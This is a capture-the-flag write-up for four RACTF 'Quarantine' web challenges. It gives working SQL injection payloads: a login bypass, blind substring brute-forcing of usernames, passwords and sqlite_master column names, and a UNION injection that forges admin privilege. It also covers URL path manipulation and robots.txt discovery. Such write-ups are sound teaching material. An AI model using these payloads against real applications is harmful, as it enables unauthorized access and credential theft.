# RACTF Write-Up - Quarantine (4 challenges)

## Quarantine - First Access

In this challenge, we have to login somehow in the application, without having any passwords.

It has a SQL Injection on the Login Screen, but wen you try the basic, it returns the message.

"Attempting to login as more than one user!??"

Which means, strangely, that it is searching for all users which that password.
OK, so we just need to bring only one user.

Assuming the query is:
`select * from users where password = 'pwd'`

We just call this:
```
select * from users where password = '' or password=(select max(password) from users) or '1'='2'
```

And we're in!

```
ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p}
```

## Quarantine: Finding Server Information

In this challenge, we have to somehow get the application source code, with a hint, that it's called "app.py".

While watching de videos, you see the URL:
```http://95.216.233.106:62020/watch/HMHT.mp4```

So, we just try:
```http://95.216.233.106:62020/watch/app.py```

And it's done (in the source code)

```ractf{qu3ry5tr1ng_m4n1pul4ti0n}```

It doesnt really brings the source, but brings the flag.

## Quarantine - Hidden Information

This easy challenge says there is a hidden information.

**/robots.txt** hiddens a URL **/admin-stash** from search engines, which has the flag.
robots.txt: ```ractf{1m_n0t_4_r0b0T}```

## Quarantine - Getting Admin

We are challenged to get an admin account (and possibly call the /admin, which is forbidden at first)

For this, I used a series of SQL Injection Attacks, so I could understand the database model.

I used a similar approach of the first SQL Injection, but I had to do it in phases.

Unfortunately, I didnt save all the information, so I'll use the info I have for the write-up.

#### Get all the usernames

Used substring to check it letter (checkin with login OK or not).

```
select * from users
where password = '' or ((select substr(lower(username), 1, 1) from users where username > '' and username = (select min(username) from users)) = 'a') or '1'='2'
```

Brute-forced with:
https://github.com/Neptunians/ractf/blob/master/2020/quarantine/brute_usernames.py

-- Found user: 'Dave'

I think I found others, but I didnt save the names :(

#### Get user password

Same approach, brute-forced with:
https://github.com/Neptunians/ractf/blob/master/2020/quarantine/brute_passwords.py

Found password:
```
'p3rf3ct1nfr4structre'
```

It was not enough to get admin.
Apparently, no user was admin.

#### Had to find more database columns

Since it was a sqlite, I didnt have a information_schema to search.
It's a bitch to get column information because, it is all contained in a string, with the create table command.

#### Found the extra column name

Found column by column, brute-forcing the name with substring (again)

With this payload, I found the number of columns and brute-forced the name of the extra column.

```
select * from users
where password = '' or (SELECT substr(sql, 26, 1) FROM sqlite_master WHERE type='table' and tbl_name = 'users' and sql like '%,%,%,%')='a' or '1'='2'
```

Used this code
https://github.com/Neptunians/ractf/blob/master/2020/quarantine/brute_column_names.py

ID, username, password AND "privilege"!

#### Privilege escalation

Found that I was logging in using privilege=1, but I needed privilege=2

-- Lets Return a fake privilege (2)
```
select * from users
where password = '' union select 'Dave', 'p3rf3ct1nfr4structre', 2 from users where username = 'Dave'
```

Final Payload: 
```
' union select 'Dave', 'p3rf3ct1nfr4structre', 2 from users where username = 'Dave
```

And after going to /admin, it's working!

```
ractf{j4va5cr1pt_w3b_t0ken}
```

### Unintended solution

After looking at the flag text, I found the intended solution was breaking the JWT.
Found other write-ups about it, so I wont write again, since it was not my solution.

Anyhow, it was fun!
